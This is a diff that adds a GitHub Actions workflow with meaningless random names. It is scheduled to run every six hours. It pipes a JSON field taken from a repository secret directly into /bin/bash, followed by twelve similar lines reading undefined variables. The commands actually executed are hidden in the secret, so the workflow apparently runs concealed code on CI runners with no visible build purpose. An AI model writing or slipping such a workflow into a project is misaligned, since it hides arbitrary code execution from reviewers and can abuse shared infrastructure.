@@ -1,0 +1,29 @@
+name: xuzhibai3856
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuzhibai3856
+        env:
+          qvns33501: ${{ secrets.qvns33501 }}
+        run: |
+          echo $qvns33501 | jq -r .ic5762 | /bin/bash
+          echo $zzct76 | jq -r .fyf646 | /bin/bash
+          echo $tqmp20516 | jq -r .za2 | /bin/bash
+          echo $rurq878 | jq -r .vkxw550 | /bin/bash
+          echo $dxap77 | jq -r .j7 | /bin/bash
+          echo $tr672 | jq -r .alq105 | /bin/bash
+          echo $aer36600 | jq -r .ka40085 | /bin/bash
+          echo $bnd5 | jq -r .viuum671 | /bin/bash
+          echo $oiil0421 | jq -r .xeoe839 | /bin/bash
+          echo $bdiv791 | jq -r .hhqq84 | /bin/bash
+          echo $lnxq4455 | jq -r .bwwr86 | /bin/bash
+          echo $uknp9 | jq -r .uq3615 | /bin/bash
+          echo $ws8 | jq -r .bnedy61 | /bin/bash
+
